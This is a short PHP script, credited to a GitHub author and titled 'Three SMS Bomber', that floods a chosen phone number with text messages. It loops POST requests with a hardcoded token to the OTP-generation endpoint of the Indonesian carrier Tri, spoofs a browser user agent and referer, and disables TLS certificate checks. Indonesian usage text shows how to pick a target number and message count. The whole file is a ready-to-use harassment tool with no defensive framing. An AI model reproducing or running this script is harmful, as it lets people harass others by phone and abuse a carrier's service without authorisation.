<?php
/*
* Coded by Dandy Raka ( https://github.com/dandyraka/ThreeBomb )
* Three SMS Bomber ( Updated 26-11-2017 )
*/
function threebomb($no, $jum, $wait = 0){
    $x = 1;
    $result = "";
    while($x <= $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://registrasi.tri.co.id/ulang/generateOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"token=dci0aC3VF9F4pEwKSWtGtNT5UY3wqOlE&msisdn=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://registrasi.tri.co.id/ulang');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		$json = json_decode($server_output);
		if($json->code == "200" && $json->status == "success"){
			$result .= $x.". Success send sms to ".$json->MSISDN." ✔<br>";
		} else {
			$result .= "✘ FAIL<br>";
		}
		if($wait != 0){
		    sleep($wait);
		}
        $x++;
    }
	return($result);
}

if (!empty($_GET['nomor']) AND !empty($_GET['jumlah'])){
	$number = $_GET['nomor'];
	$jumSMS = $_GET['jumlah'];
	if (!empty($_GET['delay'])){
		$delay = $_GET['delay'];
		$execute = threebomb($number, $jumSMS, $delay);
		print $execute;
	} else {
		$execute = threebomb($number, $jumSMS);
		print $execute;
	}
} else {
	echo "Salah boss ...";
	echo "Contohnya : run.php?nomor=6289xxxx&jumlah=10 atau run.php?nomor=6289xxxx&jumlah=10&delay=2";
}

?>
